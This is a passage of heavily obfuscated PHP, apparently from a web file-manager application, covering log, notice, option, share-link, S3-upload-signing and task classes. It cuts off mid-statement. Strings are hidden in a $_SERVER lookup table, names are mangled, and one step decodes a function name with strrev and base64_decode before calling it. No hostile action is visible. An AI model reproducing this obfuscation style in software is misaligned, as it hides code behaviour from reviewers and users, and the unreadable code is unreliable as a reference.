typeFile() { $¦ªÁã =& $_SERVER[”ôÑ§ì¸]; $÷½Ñ¯çğ = array($¦ªÁã[1844] => array($¦ªÁã[1845]), $¦ªÁã[2220] => array($¦ªÁã[2279]), $¦ªÁã[2222] => array($¦ªÁã[2280]), $¦ªÁã[1837] => array($¦ªÁã[1838], $¦ªÁã[2281]), $¦ªÁã[2230] => array(), $¦ªÁã[2232] => array(), $¦ªÁã[2234] => array(), $¦ªÁã[1847] => array($¦ªÁã[1849]), $¦ªÁã[1848] => array($¦ªÁã[1849]), $¦ªÁã[2238] => array($¦ªÁã[2282]), $¦ªÁã[2240] => array($¦ªÁã[2282]), $¦ªÁã[2242] => array($¦ªÁã[2283]), $¦ªÁã[2228] => array($¦ªÁã[2284]), $¦ªÁã[1842] => array($¦ªÁã[2285]), $¦ªÁã[2245] => array($¦ªÁã[2286]), $¦ªÁã[1841] => array($¦ªÁã[1843])); return $÷½Ñ¯çğ; } private function typeAll() { $Ø¡ÛåÍğ =& $_SERVER[”ôÑ§ì¸]; $å±¥ø–ş = $this->typeList; $ÙÈ«… ú = array_filter($this->typeFile()); foreach ($ÙÈ«… ú as $·‘îª  => $ÈÑÀ¶°) { $å±¥ø–ş[$ÈÑÀ¶°[0]] = $å±¥ø–ş[$·‘îª ]; } $å±¥ø–ş[$Ø¡ÛåÍğ[1849]] = LNG($Ø¡ÛåÍğ[2287]); $å±¥ø–ş[$Ø¡ÛåÍğ[2282]] = LNG($Ø¡ÛåÍğ[2288]); return $å±¥ø–ş; } public function addLog($¦µÓ“ïâ, $ÉÚ¹Åü” = array()) { $¥Ê¶ ¢ =& $_SERVER[”ôÑ§ì¸]; if (!isset($this->typeList[$¦µÓ“ïâ])) { return; } $üğªÓÄŠ = isset($ÉÚ¹Åü”[$¥Ê¶ ¢[1674]]) ? $ÉÚ¹Åü”[$¥Ê¶ ¢[1674]] : 0; if (!$üğªÓÄŠ) { $üğªÓÄŠ = Session::get($¥Ê¶ ¢[2003]); } if ($¦µÓ“ïâ == $¥Ê¶ ¢[2256] && is_array($ÉÚ¹Åü”[$¥Ê¶ ¢[2289]]) && !$ÉÚ¹Åü”[$¥Ê¶ ¢[2289]]) { return; } $ŞÇüãÂÇ = get_client_ip(); if (!$ÉÚ¹Åü” || strlen(json_encode($ÉÚ¹Åü”)) >= 1024) { $ÉÚ¹Åü” = array($¥Ê¶ ¢[2290] => $ŞÇüãÂÇ); } else { if (is_array($ÉÚ¹Åü”)) { $ÉÚ¹Åü”[$¥Ê¶ ¢[2290]] = $ŞÇüãÂÇ; } else { $ÉÚ¹Åü” = array($¥Ê¶ ¢[1233] => $ÉÚ¹Åü”, $¥Ê¶ ¢[2290] => $ŞÇüãÂÇ); } } $ÉÚ¹Åü” = array($¥Ê¶ ¢[1664] => Session::sign(), $¥Ê¶ ¢[1665] => intval($üğªÓÄŠ), $¥Ê¶ ¢[33] => $¦µÓ“ïâ, $¥Ê¶ ¢[1667] => json_encode($ÉÚ¹Åü”)); parent::add($ÉÚ¹Åü”); } public function remove($ê­ë¦Â‡) { $this->where(array($_SERVER[”ôÑ§ì¸][460] => $ê­ë¦Â‡))->delete(); } private function _makeOrder($İŸíÒôí = '') { $–€Íˆ­ =& $_SERVER[”ôÑ§ì¸]; $±É©”£² = $–€Íˆ­[214]; $ËºÙŠ·ğ = array($–€Íˆ­[490] => $–€Íˆ­[491], $–€Íˆ­[492] => $–€Íˆ­[493]); $Ú¬¯¸éÒ = Input::get($–€Íˆ­[498], $–€Íˆ­[7], $–€Íˆ­[2039], array($–€Íˆ­[1957], $–€Íˆ­[492])); $Ú¬¯¸éÒ = $ËºÙŠ·ğ[$Ú¬¯¸éÒ]; $İŸíÒôí = $İŸíÒôí . "{$±É©”£²}\x20{$Ú¬¯¸éÒ}"; return $this->order($İŸíÒôí); } public function get($€Ãíı¶Ğ = '') { $ó–²ğèÃ =& $_SERVER[”ôÑ§ì¸]; if (!$€Ãíı¶Ğ) { show_json(array()); } $–ó‡õ¸· = array(); if ($€Ãíı¶Ğ[$ó–²ğèÃ[1674]]) { $–ó‡õ¸·[$ó–²ğèÃ[1674]] = $€Ãíı¶Ğ[$ó–²ğèÃ[1674]]; } if (isset($€Ãíı¶Ğ[$ó–²ğèÃ[782]])) { $ãÖÜ‚¡½ = $€Ãíı¶Ğ[$ó–²ğèÃ[782]]; $üÚ›ï¤ = isset($€Ãíı¶Ğ[$ó–²ğèÃ[783]]) ? $€Ãíı¶Ğ[$ó–²ğèÃ[783]] : time(); $–ó‡õ¸·[$ó–²ğèÃ[214]] = array($ó–²ğèÃ[376], array($ãÖÜ‚¡½, $üÚ›ï¤)); } if ($€Ãíı¶Ğ[$ó–²ğèÃ[33]]) { $öóÈé¢˜ = explode($ó–²ğèÃ[50], $€Ãíı¶Ğ[$ó–²ğèÃ[33]]); $âÄ­ë¤¬ = $this->typeFile(); $„ıÁ²‚« = array(); foreach ($öóÈé¢˜ as $ªº‡‡ó–) { $„ıÁ²‚«[] = $ªº‡‡ó–; if (isset($âÄ­ë¤¬[$ªº‡‡ó–])) { $„ıÁ²‚« = array_merge($„ıÁ²‚«, $âÄ­ë¤¬[$ªº‡‡ó–]); } } $„ıÁ²‚« = array_unique($„ıÁ²‚«); if ($„ıÁ²‚«) { $–ó‡õ¸·[$ó–²ğèÃ[33]] = array($ó–²ğèÃ[7], $„ıÁ²‚«); } } else { $–ó‡õ¸·[$ó–²ğèÃ[33]] = array($ó–²ğèÃ[2291], $ó–²ğèÃ[2292]); } if (!empty($€Ãíı¶Ğ[$ó–²ğèÃ[2290]])) { $–ó‡õ¸·[$ó–²ğèÃ[493]] = array($ó–²ğèÃ[426], "\45{$€Ãíı¶Ğ[$ó–²ğèÃ[2290]]}\45"); } $Õ¶ÅÈÁ¡ = $this->_makeOrder()->where($–ó‡õ¸·)->selectPage(); if (empty($Õ¶ÅÈÁ¡[$ó–²ğèÃ[412]])) { show_json(array(), !0, $Õ¶ÅÈÁ¡[$ó–²ğèÃ[409]]); } $Õ¶ÅÈÁ¡[$ó–²ğèÃ[412]] = $this->logList($Õ¶ÅÈÁ¡[$ó–²ğèÃ[412]]); return $Õ¶ÅÈÁ¡; } private function ipAddress(&$’ÜúÚæÃ) { $÷· Ÿğ÷ =& $_SERVER[”ôÑ§ì¸]; if (!empty($’ÜúÚæÃ[$÷· Ÿğ÷[2290]])) { $¶¨İÙé = IpLocation::get($’ÜúÚæÃ[$÷· Ÿğ÷[2290]]); } else { $¶¨İÙé = LNG($÷· Ÿğ÷[2293]); } $’ÜúÚæÃ[$÷· Ÿğ÷[2294]] = $¶¨İÙé; } private function descZipDownload($–ÛÙ³ÌÎ, &$ÕŞü»ä€) { $µå…±Œ‹ =& $_SERVER[”ôÑ§ì¸]; if (!isset($–ÛÙ³ÌÎ[$µå…±Œ‹[2295]])) { return; } $ø¤öé = json_decode($–ÛÙ³ÌÎ[$µå…±Œ‹[2295]], !0); foreach ($ø¤öé as $÷¶´˜É) { try { $²î³ïë = IO::infoFullSimple($÷¶´˜É[$µå…±Œ‹[84]]); } catch (Exception $û»†¿şÖ) { continue; } $–ÛÙ³ÌÎ[$µå…±Œ‹[84]] = $÷¶´˜É[$µå…±Œ‹[84]]; $ÕŞü»ä€[] = $–ÛÙ³ÌÎ[$µå…±Œ‹[180]] = $²î³ïë[$µå…±Œ‹[180]]; $ÕŞü»ä€[] = $–ÛÙ³ÌÎ[$µå…±Œ‹[2094]] = $²î³ïë[$µå…±Œ‹[179]]; break; } return $–ÛÙ³ÌÎ; } private function getSourceList(&$´ÎØ½Û›) { $¯ıèÀ¡¾ =& $_SERVER[”ôÑ§ì¸]; $¤Òºğâ = array(); foreach ($´ÎØ½Û› as $ˆö¦ëì‚ => $Ü³›ã) { $Á¨ıïô× = json_decode($Ü³›ã[$¯ıèÀ¡¾[493]], !0); if ($Ü³›ã[$¯ıèÀ¡¾[33]] == $¯ıèÀ¡¾[1840]) { $Á¨ıïô× = $this->descZipDownload($Á¨ıïô×, $¤Òºğâ); $´ÎØ½Û›[$ˆö¦ëì‚][$¯ıèÀ¡¾[493]] = json_encode($Á¨ıïô×); continue; } if (strpos($Ü³›ã[$¯ıèÀ¡¾[33]], $¯ıèÀ¡¾[2096]) !== 0) { if (!isset($Á¨ıïô×[$¯ıèÀ¡¾[84]]) || strpos($Ü³›ã[$¯ıèÀ¡¾[33]], $¯ıèÀ¡¾[2296]) !== 0) { continue; } try { $ÇÌŒ¿½› = IO::infoFullSimple($Á¨ıïô×[$¯ıèÀ¡¾[84]]); } catch (Exception $–¬ğáà) { continue; } $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[180]] = $ÇÌŒ¿½›[$¯ıèÀ¡¾[180]]; $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[2094]] = $ÇÌŒ¿½›[$¯ıèÀ¡¾[179]]; $´ÎØ½Û›[$ˆö¦ëì‚][$¯ıèÀ¡¾[493]] = json_encode($Á¨ıïô×); continue; } $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[180]]; $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[2094]]; if ($Á¨ıïô×[$¯ıèÀ¡¾[33]] == $¯ıèÀ¡¾[587]) { $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[493]][$¯ıèÀ¡¾[1191]]; $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[493]][$¯ıèÀ¡¾[1192]]; } if ($Á¨ıïô×[$¯ıèÀ¡¾[33]] == $¯ıèÀ¡¾[2104]) { $¤Òºğâ[] = $Á¨ıïô×[$¯ıèÀ¡¾[493]][$¯ıèÀ¡¾[180]]; } } if (!$¤Òºğâ) { return array(); } return Model($¯ıèÀ¡¾[847])->sourceListInfo($¤Òºğâ, !0); } private function logList($”Ø—ê¶Å) { $’‡õ‡ÈÏ =& $_SERVER[”ôÑ§ì¸]; $Ú‡€™Åâ = array_to_keyvalue($”Ø—ê¶Å, $’‡õ‡ÈÏ[12], $’‡õ‡ÈÏ[1674]); $¯•¬¹Øµ = Model($’‡õ‡ÈÏ[566])->userListInfo(array_unique($Ú‡€™Åâ)); $ÆËÕ£ğ = $this->getSourceList($”Ø—ê¶Å); $û•âæ¯Á = $this->typeAll(); $ş’‚Ÿ§¢ = array(); $‚Ü¾â˜¯ = array(); foreach ($”Ø—ê¶Å as $ãØÕäÜÙ => $Â¬æıõ) { $­´»—ˆ = $Â¬æıõ[$’‡õ‡ÈÏ[33]]; $Û™İ€µ = isset($¯•¬¹Øµ[$Â¬æıõ[$’‡õ‡ÈÏ[1674]]]) ? $¯•¬¹Øµ[$Â¬æıõ[$’‡õ‡ÈÏ[1674]]] : !1; $·Å¬ñÂ = strpos($­´»—ˆ, $’‡õ‡ÈÏ[2297]) === 0 ? LNG($’‡õ‡ÈÏ[2298]) : LNG($’‡õ‡ÈÏ[2293]); $Â¬æıõ[$’‡õ‡ÈÏ[32]] = isset($Û™İ€µ[$’‡õ‡ÈÏ[32]]) ? $Û™İ€µ[$’‡õ‡ÈÏ[32]] : LNG($’‡õ‡ÈÏ[2293]); $Â¬æıõ[$’‡õ‡ÈÏ[2148]] = isset($Û™İ€µ[$’‡õ‡ÈÏ[2148]]) ? $Û™İ€µ[$’‡õ‡ÈÏ[2148]] : $’‡õ‡ÈÏ[12]; $Â¬æıõ[$’‡õ‡ÈÏ[1571]] = isset($û•âæ¯Á[$­´»—ˆ]) ? $û•âæ¯Á[$­´»—ˆ] : $·Å¬ñÂ; $Â¬æıõ[$’‡õ‡ÈÏ[2038]] = $Û™İ€µ; $…ï’—á¸ = json_decode($Â¬æıõ[$’‡õ‡ÈÏ[493]], !0); $Â¬æıõ[$’‡õ‡ÈÏ[2290]] = isset($…ï’—á¸[$’‡õ‡ÈÏ[2290]]) ? $…ï’—á¸[$’‡õ‡ÈÏ[2290]] : $’‡õ‡ÈÏ[12]; $Â¬æıõ[$’‡õ‡ÈÏ[2294]] = IpLocation::get($Â¬æıõ[$’‡õ‡ÈÏ[2290]]); if (strpos($­´»—ˆ, $’‡õ‡ÈÏ[2096]) === 0 || isset($…ï’—á¸[$’‡õ‡ÈÏ[2094]])) { $…ï’—á¸[$’‡õ‡ÈÏ[87]] = $ÆËÕ£ğ[$…ï’—á¸[$’‡õ‡ÈÏ[180]]]; $…ï’—á¸[$’‡õ‡ÈÏ[2109]] = $ÆËÕ£ğ[$…ï’—á¸[$’‡õ‡ÈÏ[2094]]]; if ($…ï’—á¸[$’‡õ‡ÈÏ[33]] == $’‡õ‡ÈÏ[587]) { $…ï’—á¸[$’‡õ‡ÈÏ[493]][$’‡õ‡ÈÏ[1191]] = $ÆËÕ£ğ[$…ï’—á¸[$’‡õ‡ÈÏ[493]][$’‡õ‡ÈÏ[1191]]]; $…ï’—á¸[$’‡õ‡ÈÏ[493]][$’‡õ‡ÈÏ[1192]] = $ÆËÕ£ğ[$…ï’—á¸[$’‡õ‡ÈÏ[493]][$’‡õ‡ÈÏ[1192]]]; } if ($…ï’—á¸[$’‡õ‡ÈÏ[33]] == $’‡õ‡ÈÏ[2104]) { $…ï’—á¸[$’‡õ‡ÈÏ[493]][$’‡õ‡ÈÏ[180]] = $ÆËÕ£ğ[$…ï’—á¸[$’‡õ‡ÈÏ[493]][$’‡õ‡ÈÏ[180]]]; } if ($…ï’—á¸[$’‡õ‡ÈÏ[33]] == $’‡õ‡ÈÏ[1835]) { $…ï’—á¸[$’‡õ‡ÈÏ[2109]] = $…ï’—á¸[$’‡õ‡ÈÏ[87]]; $…ï’—á¸[$’‡õ‡ÈÏ[2094]] = $…ï’—á¸[$’‡õ‡ÈÏ[2109]][$’‡õ‡ÈÏ[180]]; $…ï’—á¸[$’‡õ‡ÈÏ[87]] = !1; $…ï’—á¸[$’‡õ‡ÈÏ[180]] = $’‡õ‡ÈÏ[12]; } if ($…ï’—á¸[$’‡õ‡ÈÏ[87]] && $…ï’—á¸[$’‡õ‡ÈÏ[87]][$’‡õ‡ÈÏ[177]] == $’‡õ‡ÈÏ[178]) { $‚Ü¾â˜¯[] = $Â¬æıõ[$’‡õ‡ÈÏ[442]]; unset($”Ø—ê¶Å[$ãØÕäÜÙ]); continue; } if ($…ï’—á¸[$’‡õ‡ÈÏ[2109]] && $…ï’—á¸[$’‡õ‡ÈÏ[2109]][$’‡õ‡ÈÏ[177]] == $’‡õ‡ÈÏ[178]) { $‚Ü¾â˜¯[] = $Â¬æıõ[$’‡õ‡ÈÏ[442]]; unset($”Ø—ê¶Å[$ãØÕäÜÙ]); continue; } } $Â¬æıõ[$’‡õ‡ÈÏ[493]] = $…ï’—á¸; unset($Â¬æıõ[$’‡õ‡ÈÏ[2299]]); $ş’‚Ÿ§¢[] = $Â¬æıõ; } $this->clearSystemPathLog($‚Ü¾â˜¯); return $ş’‚Ÿ§¢; } private function clearSystemPathLog($®…Ş½Œá) { $Û¢ñŞÎë =& $_SERVER[”ôÑ§ì¸]; if (count($®…Ş½Œá) == 0) { return; } $šî–¼² = array($Û¢ñŞÎë[442] => array($Û¢ñŞÎë[7], array_unique($®…Ş½Œá))); $this->where($šî–¼²)->delete(); } public function deviceList($‡º—­«à, $˜ï–û¡² = 0) { $§Û³š¸ =& $_SERVER[”ôÑ§ì¸]; $¹ªçœ½ = array($§Û³š¸[1674] => $‡º—­«à, $§Û³š¸[214] => array($§Û³š¸[1045], $˜ï–û¡²), $§Û³š¸[33] => $§Û³š¸[1809]); $ËÖß«ê½ = array(); $˜Õ¸Ê = $this->field($§Û³š¸[2300])->where($¹ªçœ½)->order($§Û³š¸[2107])->limit(50)->select(); foreach ($˜Õ¸Ê as $‡ºò§” => $ô»ù¾ïæ) { if ($‡ºò§” > 0 && abs($ô»ù¾ïæ[$§Û³š¸[214]] - $˜Õ¸Ê[$‡ºò§” - 1][$§Û³š¸[214]]) < 5) { continue; } $½“¹£ªÁ = json_decode($ô»ù¾ïæ[$§Û³š¸[493]], !0); $ô»ù¾ïæ[$§Û³š¸[2290]] = isset($½“¹£ªÁ[$§Û³š¸[2290]]) ? $½“¹£ªÁ[$§Û³š¸[2290]] : $§Û³š¸[12]; unset($½“¹£ªÁ[$§Û³š¸[2290]]); $’À• İÁ = $this->deviceType($½“¹£ªÁ[$§Û³š¸[2097]]); if (isset($ËÖß«ê½[$’À• İÁ])) { continue; } $ô»ù¾ïæ[$§Û³š¸[2294]] = IpLocation::get($ô»ù¾ïæ[$§Û³š¸[2290]]); $ô»ù¾ïæ[$§Û³š¸[493]] = $½“¹£ªÁ; $ËÖß«ê½[$’À• İÁ] = $ô»ù¾ïæ; } return array_values($ËÖß«ê½); } public function deviceType($¦üçõàÑ) { return $¦üçõàÑ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x6e\x6f\164\x69\x63\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\143\x6f\x6e\164\x65\156\x74", "\141\165\x74\150", "\155\x6f\x64\x65", "\x74\x69\x6d\145", "\x74\171\x70\x65", "\154\145\166\145\154", "\145\156\141\x62\x6c\x65", "\163\x6f\x72\x74"); public function listData($ãº…Ÿäş = false, $•›¨‹²Ÿ = "\163\x6f\162\x74", $ıîÄ¢å« = false) { return parent::listData($ãº…Ÿäş, $•›¨‹²Ÿ, $ıîÄ¢å«); } public function add($Í›â‘Ó) { $èĞ¹ô© =& $_SERVER[”ôÑ§ì¸]; $±Ø×“À— = time(); if ($Í›â‘Ó[$èĞ¹ô©[16]] == $èĞ¹ô©[2301]) { $±Ø×“À— = strtotime($Í›â‘Ó[$èĞ¹ô©[193]]); } $Í›â‘Ó[$èĞ¹ô©[193]] = $±Ø×“À—; return parent::insert($Í›â‘Ó); } public function update($ıŒÊîÎ, $©öÏ¶ä) { $Õ ô‰òÎ =& $_SERVER[”ôÑ§ì¸]; $îÇØ‚·Ì = $this->listData($ıŒÊîÎ); if (!$îÇØ‚·Ì) { return !1; } $î‚ĞÔØé = time(); if ($©öÏ¶ä[$Õ ô‰òÎ[16]] == $Õ ô‰òÎ[2301]) { $î‚ĞÔØé = strtotime($©öÏ¶ä[$Õ ô‰òÎ[193]]); } $©öÏ¶ä[$Õ ô‰òÎ[193]] = $î‚ĞÔØé; return parent::update($ıŒÊîÎ, $©öÏ¶ä); } public function remove($¤óºµ…·) { $Œ’íœø = $this->listData($¤óºµ…·); if (!$Œ’íœø || $Œ’íœø[$_SERVER[”ôÑ§ì¸][178]]) { return !1; } return parent::remove($¤óºµ…·); } public function sort($áíÁô°†, $­æıÁ²¢) { return parent::update($áíÁô°†, $­æıÁ²¢); } public function enable($‘ßêı½ƒ, $ªı‚İ‘) { return parent::update($‘ßêı½ƒ, array($_SERVER[”ôÑ§ì¸][2302] => $ªı‚İ‘)); } private function initUserOption() { $Úè¨¸”ã =& $_SERVER[”ôÑ§ì¸]; $this->optionType = $Úè¨¸”ã[2303]; $this->modelType = $Úè¨¸”ã[2304]; $this->field = array($Úè¨¸”ã[2305], $Úè¨¸”ã[32], $Úè¨¸”ã[193], $Úè¨¸”ã[33], $Úè¨¸”ã[2306], $Úè¨¸”ã[772], $Úè¨¸”ã[209]); } public function userNoticeGet($®ÒÍ½û = false) { $this->initUserOption(); return parent::listData($®ÒÍ½û, $_SERVER[”ôÑ§ì¸][442], !0); } public function userNoticeAdd($ÇÌ“Í©º) { $æ¡ˆ¥©‡ =& $_SERVER[”ôÑ§ì¸]; $this->initUserOption(); $ÍªÊ°äÍ = $this->findByKey($æ¡ˆ¥©‡[2305], $ÇÌ“Í©º[$æ¡ˆ¥©‡[442]]); if ($ÍªÊ°äÍ) { return !0; } $³×ÈãÍò = array($æ¡ˆ¥©‡[2305] => $ÇÌ“Í©º[$æ¡ˆ¥©‡[442]], $æ¡ˆ¥©‡[32] => $ÇÌ“Í©º[$æ¡ˆ¥©‡[32]], $æ¡ˆ¥©‡[193] => $ÇÌ“Í©º[$æ¡ˆ¥©‡[193]], $æ¡ˆ¥©‡[33] => isset($ÇÌ“Í©º[$æ¡ˆ¥©‡[33]]) ? $ÇÌ“Í©º[$æ¡ˆ¥©‡[33]] : 1, $æ¡ˆ¥©‡[2306] => isset($ÇÌ“Í©º[$æ¡ˆ¥©‡[2306]]) ? $ÇÌ“Í©º[$æ¡ˆ¥©‡[2306]] : 0, $æ¡ˆ¥©‡[772] => 0, $æ¡ˆ¥©‡[209] => 0); return parent::insert($³×ÈãÍò); } public function userNoticeEdit($íó×»™, $¶Üªü×¸) { $this->initUserOption(); return parent::update($íó×»™, $¶Üªü×¸); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\155\137\x6f\160\164\151\157\x6e"; protected $jsonField = array("\x6d\x65\156\165", "\162\157\x6c\x65", "\x72\157\154\145\107\x72\157\165\x70", "\x72\145\147\151\x73\x74", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($—‰îûÉÂ) { return "\123\171\163\x74\x65\155\117\160\x74\x69\x6f\x6e\x5f{$—‰îûÉÂ}"; } protected function optionDefault($™š‰ÌãÉ = '') { $áÓÁóß =& $_SERVER[”ôÑ§ì¸]; if ($™š‰ÌãÉ == $áÓÁóß[12]) { return $GLOBALS[$áÓÁóß[6]][$áÓÁóß[424]]; } } } goto aŒŒ·‘ê‚; CµÄâ„ö°—: $fileSize = strrev(base64_decode($_SERVER[­¿“¤è][0])); function binCheckNeq($ˆ²ˆÆŞã, $Ğ½öÙ½) { return $ˆ²ˆÆŞã != $Ğ½öÙ½; } $_SERVER[$_SERVER[­¿“¤è][1]] = $fileSize($_SERVER[$_SERVER[­¿“¤è][2]]); goto aÌ ‡”»©Ç; FÆ†ã‡íÆ›: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¯õŞÖƒ²) { $this->pathParse = $¯õŞÖƒ²; } protected function infoParse($×‚ÇïÎ×, $û¼ÅßùÄ = false) { $Á¬ ì°¬ =& $_SERVER[”ôÑ§ì¸]; return Action($Á¬ ì°¬[1205])->sharePathInfo($this->pathParse[$Á¬ ì°¬[84]], !0, $û¼ÅßùÄ); } public function listPath($Ù°áÎù, $Â±íÖşÙ = false) { $â¦ÇÑŞÜ =& $_SERVER[”ôÑ§ì¸]; $À£àÍ‡È = IO::listPath($Ù°áÎù, $Â±íÖşÙ); if (!$À£àÍ‡È) { return $À£àÍ‡È; } if (is_array($À£àÍ‡È[$â¦ÇÑŞÜ[1371]])) { $”ÙªÍìÒ = Action($â¦ÇÑŞÜ[1380])->parsePathChildren($À£àÍ‡È[$â¦ÇÑŞÜ[1371]], array($â¦ÇÑŞÜ[462] => $Ù°áÎù)); $À£àÍ‡È[$â¦ÇÑŞÜ[1371]] = Action($â¦ÇÑŞÜ[1205])->shareItemInfo($”ÙªÍìÒ); } foreach ($À£àÍ‡È as $½Í­ç¸ => $‘şµ×Œ) { if (!in_array($½Í­ç¸, array($â¦ÇÑŞÜ[83], $â¦ÇÑŞÜ[82]))) { continue; } foreach ($‘şµ×Œ as $¸¸šŸ¢ü => $”ÙªÍìÒ) { $”ÙªÍìÒ = Action($â¦ÇÑŞÜ[1380])->parsePathChildren($”ÙªÍìÒ, array($â¦ÇÑŞÜ[462] => $Ù°áÎù)); $À£àÍ‡È[$½Í­ç¸][$¸¸šŸ¢ü] = Action($â¦ÇÑŞÜ[1205])->shareItemInfo($”ÙªÍìÒ); } } return $À£àÍ‡È; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($æ¿Ø‡âı) { parent::__construct($æ¿Ø‡âı); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($í©Éòæ¦) { parent::__construct($í©Éòæ¦); $this->signatureVersion($_SERVER[”ôÑ§ì¸][230]); } public function uploadFormData($ï¼×íÛ¢, $Ğ›öÈ¶± = 3600) { $ÄÏ˜ Øš =& $_SERVER[”ôÑ§ì¸]; $£ »”İÀ = $ÄÏ˜ Øš[212]; $İƒ Ó = $ÄÏ˜ Øš[252]; $“İÍ©Ş€ = $ÄÏ˜ Øš[62]; $¬Úâ™Û = gmdate($ÄÏ˜ Øš[253]); $Ñµ¼Á‹ö = gmdate($ÄÏ˜ Øš[254]); $€úÁ„ı± = $ÄÏ˜ Øš[255]; $‰˜Ù»õ¦ = $Ğ›öÈ¶± . $ÄÏ˜ Øš[12]; $‹Å÷¼ãá = $ÄÏ˜ Øš[256]; $î¯¥ö¶ = array($this->accessKey, $Ñµ¼Á‹ö, $this->region, $“İÍ©Ş€, $€úÁ„ı±); $Íé±¢ã = implode($ÄÏ˜ Øš[8], $î¯¥ö¶); $ıãœ¼£ö = array($ÄÏ˜ Øš[257] => gmdate($ÄÏ˜ Øš[1355], strtotime($ÄÏ˜ Øš[259])), $ÄÏ˜ Øš[260] => array(array($ÄÏ˜ Øš[261] => $this->bucket), array($ÄÏ˜ Øš[262] => $£ »”İÀ), array($ÄÏ˜ Øš[263], $ÄÏ˜ Øš[264], $ÄÏ˜ Øš[12]), array($ÄÏ˜ Øš[263], $ÄÏ˜ Øš[265], $ÄÏ˜ Øš[12]), array($ÄÏ˜ Øš[263], $ÄÏ˜ Øš[266], $ÄÏ˜ Øš[12]), array($ÄÏ˜ Øš[267] => $‹Å÷¼ãá), array($ÄÏ˜ Øš[268] => $Íé±¢ã), array($ÄÏ˜ Øš[269] => $İƒ Ó), array($ÄÏ˜ Øš[270] => $¬Úâ™Û), array($ÄÏ˜ Øš[271] => $‰˜Ù»õ¦))); $‰ˆĞÂ«² = base64_encode(json_encode($ıãœ¼£ö)); $µ„±›« = hash_hmac($ÄÏ˜ Øš[272], $Ñµ¼Á‹ö, $ÄÏ˜ Øš[273] . $this->secret, !0); $ì¾¿ôØ° = hash_hmac($ÄÏ˜ Øš[272], $this->region, $µ„±›«, !0); $«¢‹¹Çğ = hash_hmac($ÄÏ˜ Øš[272], $“İÍ©Ş€, $ì¾¿ôØ°, !0); $­‡¦•„ = hash_hmac($ÄÏ˜ Øš[272], $€úÁ„ı±, $«¢‹¹Çğ, !0); $§ô×¿¯ê = hash_hmac($ÄÏ˜ Øš[272], $‰ˆĞÂ«², $­‡¦•„); $˜¢ßâÛ” = array($ÄÏ˜ Øš[229] => $ÄÏ˜ Øš[12], $ÄÏ˜ Øš[274] => $ÄÏ˜ Øš[12], $ÄÏ˜ Øš[262] => $£ »”İÀ, $ÄÏ˜ Øš[267] => $‹Å÷¼ãá, $ÄÏ˜ Øš[275] => $‰ˆĞÂ«², $ÄÏ˜ Øš[276] => $Íé±¢ã, $ÄÏ˜ Øš[277] => $İƒ Ó, $ÄÏ˜ Øš[278] => $¬Úâ™Û, $ÄÏ˜ Øš[279] => $‰˜Ù»õ¦, $ÄÏ˜ Øš[280] => $§ô×¿¯ê, $ÄÏ˜ Øš[195] => $this->getHost()); return $˜¢ßâÛ”; } } goto EèŠø§´Ò÷; aÇ‰»µìªŠ: define($_SERVER[”ôÑ§ì¸][284], 1); define($_SERVER[”ôÑ§ì¸][285], 0); define($_SERVER[”ôÑ§ì¸][286], 2); goto F½Ş…ÍÙİÃ; cÖ–’ˆñÚ¡: class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\156\x69\156\x67"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Øì†»ä›, $ÆÈ”Ïí = '', $­Û»¶‡Ú = 0, $Ã÷´×ºÊ = '') { $ò³‡áªã =& $_SERVER[”ôÑ§ì¸]; if (self::get($Øì†»ä›)) { return; } $this->task = array($ò³‡áªã[442] => $Øì†»ä›, $ò³‡áªã[1674] => USER_ID, $ò³‡áªã[1571] => $Ã÷´×ºÊ, $ò³‡áªã[493] => $ò³‡áªã[12], $ò³‡áªã[33] => $ÆÈ”Ïí, $ò³‡áªã[1095] => $ò³‡áªã[12], $ò³‡áªã[808] => $­Û»¶‡Ú, $ò³‡áªã[1675] => 0, $ò³‡áªã[1676] => 0, $ò³‡áªã[1677] => 0, $ò³‡áªã[1678] => timeFloat(), $ò³‡áªã[1679] => 0, $ò³‡áªã[1680] => 0, $ò³‡áªã[1681] => 0, $ò³‡áªã[1682] => 0, $ò³‡áªã[772] => $ò³‡áªã[1630]); $GLOBALS[$ò³‡áªã[1683]] = 1; Hook::bind($ò³‡áªã[1634], array($this, $ò³‡áªã[1684])); Hook::bind($ò³‡áªã[1685], array($this, $ò³‡áªã[1686])); $this->startAfter(); Hook::trigger($ò³‡áªã[1687], $this->task); $this->task[$ò³‡áªã[1680]] = timeFloat(); } public function end($¢ŸÃïÙ¬ = '') { $ÛÔäÉ‚ =& $_SERVER[”ôÑ§ì¸]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÛÔäÉ‚[1680]]) { self::valueSet($this->task[$ÛÔäÉ‚[442]], !1); } $this->isEnd = !0; if ($¢ŸÃïÙ¬) { $this->task[$ÛÔäÉ‚[493]] = $¢ŸÃïÙ¬; } self::log($ÛÔäÉ‚[1688] . $this->task[$ÛÔäÉ‚[442]] . $ÛÔäÉ‚[1689] . sprintf($ÛÔäÉ‚[881], timeFloat() - $this->task[$ÛÔäÉ‚[1678]]) . $ÛÔäÉ‚[1690]); Hook::unbind($ÛÔäÉ‚[1634], array($this, $ÛÔäÉ‚[1684])); Hook::unbind($ÛÔäÉ‚[1685], array($this, $ÛÔäÉ‚[1686])); $this->endAfter(); $Ğ‚åºî = $this->task; $this->task = !1; Hook::trigger($ÛÔäÉ‚[1691], $Ğ‚åºî); } public function update($Ç¥¯±Ó¿ = 0, $ïÇ¢®¢˜ = false) { $ÉŒÃ¥ßò =& $_SERVER[”ôÑ§ì¸]; $¢Àæ –î =& 